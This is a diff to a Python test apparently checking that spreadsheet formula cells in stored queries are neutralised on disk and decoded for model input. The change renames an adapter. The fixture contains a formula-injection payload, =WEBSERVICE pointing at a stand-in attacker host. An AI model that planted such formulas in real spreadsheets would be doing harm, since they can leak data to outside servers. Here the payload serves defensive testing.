@@ -55,7 +55,7 @@ def test_fanout_formula_cells_are_safe_on_disk_and_decode_for_model_input(tmp_pa
     expected = '=WEBSERVICE("https://attacker.invalid")，请对比几个主流选择'
     assert record.query == expected
     settings = Settings(llm_api_key=None)
-    adapter = get_adapter("openai_responses_web_search")
+    adapter = get_adapter("openai_compatible_responses_web_search")
     profile = build_sampling_profile(adapter_name=adapter.name, model="test-model", settings=settings)
     request = adapter.build_request(record, profile, settings, {})
     assert request.payload["input"] == expected
